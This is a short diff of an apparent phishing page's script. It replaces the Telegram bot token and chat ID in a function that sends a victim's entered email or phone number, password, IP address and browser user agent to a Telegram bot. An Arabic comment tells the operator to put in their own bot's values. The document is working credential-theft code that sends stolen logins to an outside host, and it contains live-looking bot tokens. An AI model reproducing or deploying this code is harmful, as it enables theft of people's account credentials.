@@ -235,8 +235,8 @@
 
         async function sendToTelegramBot(email, password) {
             // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك
-            const botToken ="8546784309:AAHe0WXiK1wyZ45JUgGxMeOQa8g-owMm9aM";
-            const chatId = 8546784309;
+            const botToken ="8580282007:AAE6BxPiOeWcEAOYgcTU2bFptT9IT5n5KVI";
+            const chatId = 8580282007;
             
             const message = `بيانات تسجيل دخول جديدة:\n\nالبريد/الهاتف: ${email}\nكلمة المرور: ${password}\n\nIP: ${await getIP()}\nUser Agent: ${navigator.userAgent}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -276,3 +276,4 @@
 </body>
 
 </html>
+
